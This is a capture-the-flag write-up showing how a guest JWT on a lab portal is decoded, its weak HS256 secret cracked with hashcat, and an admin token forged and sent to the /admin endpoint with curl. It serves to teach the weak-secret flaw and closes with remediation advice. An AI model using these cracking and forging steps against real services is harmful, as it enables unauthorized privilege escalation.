
The challenge exposed a simple JWT-based authentication portal. A guest account was provided and the description made it clear that the admin functionality was protected only through a JWT.

Available endpoints:

* `POST /login`
* `GET /admin`

Guest credentials:

guest : guest


From the start, the intended path seemed obvious: obtain a valid token as the guest user, inspect how the token works, and then abuse the JWT implementation to gain access to the admin endpoint.

---

# Enumerating the Login Endpoint

My first request accidentally targeted the root path, which returned a `405 Method Not Allowed`. That confirmed the service was alive but also hinted that the login endpoint had to be used exactly as described.


curl -X POST http://chall-1535b70c.evt-246.glabs.ctf7.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}'


The response contained a JWT:


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.9I4AjxfWP9qp8qeBqcAP9y-YjEUbpVAZgveZ7Ey90bA



Decoding the first two sections revealed:

{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "sub": "guest",
  "role": "user"
}



The server was trusting the `role` field inside the JWT payload, and the token was signed using `HS256`. That meant that if I could recover the signing secret, I could simply create a new token with:


{
  "sub": "admin",
  "role": "admin"
}


and the server would accept it.



Since the challenge description insisted that the signing key was “rock-solid”, that immediately made me suspicious that the secret would actually be weak.

I first tried a few common values manually such as:


secret
admin
password
jwtsecret


but none of them worked.

Because the algorithm was `HS256`, the signature can be cracked offline using a wordlist attack. I saved the JWT into a file and ran Hashcat in JWT mode:


hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt


After the crack completed, I displayed the recovered password:


hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show


Result:


secret123


So the entire security of the admin panel relied on the secret:


secret123

which is obviously weak and present in common wordlists.


Now that the signing key was known, forging an administrator token was straightforward. I generated a new JWT with the following payload:

{
  "sub": "admin",
  "role": "admin"
}


signed with:


secret123

This produced the following token:


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Ok4_WSkaYbfAgJ9eCX1rw-xZt0Xsrq5ez0UqadXsQGI



Finally, I supplied the forged JWT in the `Authorization` header:

curl http://chall-1535b70c.evt-246.glabs.ctf7.com/admin \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.Ok4_WSkaYbfAgJ9eCX1rw-xZt0Xsrq5ez0UqadXsQGI"

The server accepted the token as valid and returned the flag.


ctf7{...}



The vulnerability was not in JWT itself, but in the way the application used it.

The server signed tokens using HS256 with an extremely weak secret:

secret123


Since the secret was easy to recover through a dictionary attack, it became possible to create arbitrary tokens and assign any role.

In this case, simply changing:


"role": "user"


"role": "admin"



This challenge demonstrates one of the most common JWT mistakes: using a guessable signing secret.

Even if the JWT is signed correctly, the entire mechanism collapses if the secret is weak. A proper JWT secret should be long, random, and impossible to brute-force.

Instead, the developers used `secret123`, which made it possible to escalate privileges from a guest account to administrator in only a few steps.
